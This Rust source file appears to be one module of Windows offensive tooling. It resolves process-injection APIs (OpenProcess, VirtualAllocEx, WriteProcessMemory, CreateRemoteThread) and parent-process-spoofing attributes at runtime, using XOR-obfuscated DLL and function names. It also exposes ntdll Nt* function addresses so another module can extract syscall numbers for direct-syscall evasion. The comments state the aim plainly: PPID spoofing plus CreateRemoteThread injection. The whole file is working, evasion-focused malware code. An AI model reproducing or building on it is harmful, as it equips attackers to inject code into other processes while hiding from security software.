// dynload.rs
// Dynamic API resolution with compile-time XOR-obfuscated function/DLL names.
// Only resolvers required for PPID-spoof + CreateRemoteThread injection are included.

use std::ffi::c_void;
use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32;
use windows::Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOW};

// ── Function pointer type aliases ─────────────────────────────────────────────

pub type FnOpenProcess          = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
pub type FnCloseHandle          = unsafe extern "system" fn(*mut c_void) -> i32;
pub type FnVirtualAllocEx       = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
pub type FnVirtualProtectEx     = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, *mut u32) -> i32;
pub type FnWriteProcessMemory   = unsafe extern "system" fn(*mut c_void, *mut c_void, *const c_void, usize, *mut usize) -> i32;
pub type FnCreateRemoteThread   = unsafe extern "system" fn(*mut c_void, *const c_void, usize, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *const c_void, u32, *mut u32) -> *mut c_void;
pub type FnInitProcThreadAttr   = unsafe extern "system" fn(*mut c_void, u32, u32, *mut usize) -> i32;
pub type FnUpdateProcThreadAttr = unsafe extern "system" fn(*mut c_void, u32, usize, *const c_void, usize, *mut c_void, *mut usize) -> i32;
pub type FnDeleteProcThreadAttr = unsafe extern "system" fn(*mut c_void);
pub type FnCreateProcessW       = unsafe extern "system" fn(*const u16, *mut u16, *const c_void, *const c_void, i32, u32, *const c_void, *const u16, *const STARTUPINFOW, *mut PROCESS_INFORMATION) -> i32;
pub type FnSnapshot             = unsafe extern "system" fn(u32, u32) -> *mut c_void;
pub type FnProcess32First       = unsafe extern "system" fn(*mut c_void, *mut PROCESSENTRY32) -> i32;
pub type FnProcess32Next        = unsafe extern "system" fn(*mut c_void, *mut PROCESSENTRY32) -> i32;
pub type FnSleep                = unsafe extern "system" fn(u32);

// ── XOR decode (KEY = 0x5A) ───────────────────────────────────────────────────

const KEY: u8 = 0x5A;

fn decode(enc: &[u8]) -> Vec<u8> {
    let mut v: Vec<u8> = enc.iter().map(|b| b ^ KEY).collect();
    v.push(0);
    v
}

unsafe fn resolve<T>(dll_enc: &[u8], name_enc: &[u8]) -> Option<T> {
    let dll  = decode(dll_enc);
    let name = decode(name_enc);
    let hmod = LoadLibraryA(PCSTR(dll.as_ptr())).ok()?;
    let proc = GetProcAddress(hmod, PCSTR(name.as_ptr()))?;
    Some(std::mem::transmute_copy(&proc))
}

// ── Encoded names ─────────────────────────────────────────────────────────────

const K32:  &[u8] = &[0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68,0x74,0x3E,0x36,0x36]; // kernel32.dll
const NTDLL: &[u8] = &[0x34,0x2E,0x3E,0x36,0x36,0x74,0x3E,0x36,0x36];               // ntdll.dll
const KB:   &[u8] = &[0x31,0x3F,0x28,0x34,0x3F,0x36,0x38,0x3B,0x29,0x3F,0x74,0x3E,0x36,0x36]; // kernelbase.dll

// NT function names — used by syscall.rs to resolve stubs and extract SSNs.
pub const N_NT_ALLOC:   &[u8] = &[0x14,0x2E,0x1B,0x36,0x36,0x35,0x39,0x3B,0x2E,0x3F,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23]; // NtAllocateVirtualMemory
pub const N_NT_WRITE:   &[u8] = &[0x14,0x2E,0x0D,0x28,0x33,0x2E,0x3F,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23];                 // NtWriteVirtualMemory
pub const N_NT_PROTECT: &[u8] = &[0x14,0x2E,0x0A,0x28,0x35,0x2E,0x3F,0x39,0x2E,0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x17,0x3F,0x37,0x35,0x28,0x23];       // NtProtectVirtualMemory
pub const N_NT_THREAD:  &[u8] = &[0x14,0x2E,0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0E,0x32,0x28,0x3F,0x3B,0x3E,0x1F,0x22];                                     // NtCreateThreadEx

const N_OPEN_PROCESS:             &[u8] = &[0x15,0x2A,0x3F,0x34,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29];
const N_CLOSE_HANDLE:             &[u8] = &[0x19,0x36,0x35,0x29,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F];
const N_VIRTUAL_ALLOC_EX:         &[u8] = &[0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x1B,0x36,0x36,0x35,0x39,0x1F,0x22];
const N_VIRTUAL_PROTECT_EX:       &[u8] = &[0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x0A,0x28,0x35,0x2E,0x3F,0x39,0x2E,0x1F,0x22];
const N_WRITE_PROCESS_MEMORY:     &[u8] = &[0x0D,0x28,0x33,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x17,0x3F,0x37,0x35,0x28,0x23];
const N_CREATE_REMOTE_THREAD:     &[u8] = &[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x08,0x3F,0x37,0x35,0x2E,0x3F,0x0E,0x32,0x28,0x3F,0x3B,0x3E];
const N_INIT_PROC_THREAD_ATTR:    &[u8] = &[0x13,0x34,0x33,0x2E,0x33,0x3B,0x36,0x33,0x20,0x3F,0x0A,0x28,0x35,0x39,0x0E,0x32,0x28,0x3F,0x3B,0x3E,0x1B,0x2E,0x2E,0x28,0x33,0x38,0x2F,0x2E,0x3F,0x16,0x33,0x29,0x2E];
const N_UPDATE_PROC_THREAD_ATTR:  &[u8] = &[0x0F,0x2A,0x3E,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x0E,0x32,0x28,0x3F,0x3B,0x3E,0x1B,0x2E,0x2E,0x28,0x33,0x38,0x2F,0x2E,0x3F];
const N_DELETE_PROC_THREAD_ATTR:  &[u8] = &[0x1E,0x3F,0x36,0x3F,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x0E,0x32,0x28,0x3F,0x3B,0x3E,0x1B,0x2E,0x2E,0x28,0x33,0x38,0x2F,0x2E,0x3F,0x16,0x33,0x29,0x2E];
const N_CREATE_PROCESS_W:         &[u8] = &[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0D];
const N_CREATE_TOOLHELP32_SNAP:   &[u8] = &[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0E,0x35,0x35,0x36,0x32,0x3F,0x36,0x2A,0x69,0x68,0x09,0x34,0x3B,0x2A,0x29,0x32,0x35,0x2E];
const N_PROCESS32_FIRST:          &[u8] = &[0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x69,0x68,0x1C,0x33,0x28,0x29,0x2E];
const N_PROCESS32_NEXT:           &[u8] = &[0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x69,0x68,0x14,0x3F,0x22,0x2E];
const N_SLEEP:                    &[u8] = &[0x09,0x36,0x3F,0x3F,0x2A];

// ── Public resolver functions ─────────────────────────────────────────────────

pub unsafe fn open_process()            -> Option<FnOpenProcess>          { resolve(K32, N_OPEN_PROCESS) }
pub unsafe fn close_handle()            -> Option<FnCloseHandle>          { resolve(K32, N_CLOSE_HANDLE) }
pub unsafe fn virtual_alloc_ex()        -> Option<FnVirtualAllocEx>       { resolve(K32, N_VIRTUAL_ALLOC_EX) }
pub unsafe fn virtual_protect_ex()      -> Option<FnVirtualProtectEx>     { resolve(K32, N_VIRTUAL_PROTECT_EX) }
pub unsafe fn write_process_memory()    -> Option<FnWriteProcessMemory>   { resolve(K32, N_WRITE_PROCESS_MEMORY) }
pub unsafe fn create_remote_thread()    -> Option<FnCreateRemoteThread>   { resolve(K32, N_CREATE_REMOTE_THREAD) }
pub unsafe fn init_proc_thread_attr()   -> Option<FnInitProcThreadAttr>   { resolve(K32, N_INIT_PROC_THREAD_ATTR) }
pub unsafe fn update_proc_thread_attr() -> Option<FnUpdateProcThreadAttr> { resolve(K32, N_UPDATE_PROC_THREAD_ATTR) }
pub unsafe fn delete_proc_thread_attr() -> Option<FnDeleteProcThreadAttr> { resolve(K32, N_DELETE_PROC_THREAD_ATTR) }
pub unsafe fn create_process_w()        -> Option<FnCreateProcessW>       { resolve(K32, N_CREATE_PROCESS_W) }
pub unsafe fn toolhelp32_snapshot()     -> Option<FnSnapshot>             { resolve(K32, N_CREATE_TOOLHELP32_SNAP) }
pub unsafe fn process32_first()         -> Option<FnProcess32First>       { resolve(K32, N_PROCESS32_FIRST) }
pub unsafe fn process32_next()          -> Option<FnProcess32Next>        { resolve(K32, N_PROCESS32_NEXT) }
pub unsafe fn sleep()                   -> Option<FnSleep>                { resolve(K32, N_SLEEP) }

/// Return the base address of ntdll (the HMODULE value from LoadLibraryA).
pub unsafe fn ntdll_base() -> Option<*const u8> {
    let dll = decode(NTDLL);
    let hmod = LoadLibraryA(PCSTR(dll.as_ptr())).ok()?;
    Some(hmod.0 as *const u8)
}

/// Return the base address of kernelbase.dll.
pub unsafe fn kernelbase_base() -> Option<*const u8> {
    let dll = decode(KB);
    let hmod = LoadLibraryA(PCSTR(dll.as_ptr())).ok()?;
    Some(hmod.0 as *const u8)
}

/// Return the raw address of an ntdll export for SSN parsing — no type cast.
pub unsafe fn nt_raw(name_enc: &[u8]) -> Option<*const std::ffi::c_void> {
    let dll  = decode(NTDLL);
    let name = decode(name_enc);
    let hmod = LoadLibraryA(PCSTR(dll.as_ptr())).ok()?;
    let proc = GetProcAddress(hmod, PCSTR(name.as_ptr()))?;
    Some(proc as *const std::ffi::c_void)
}
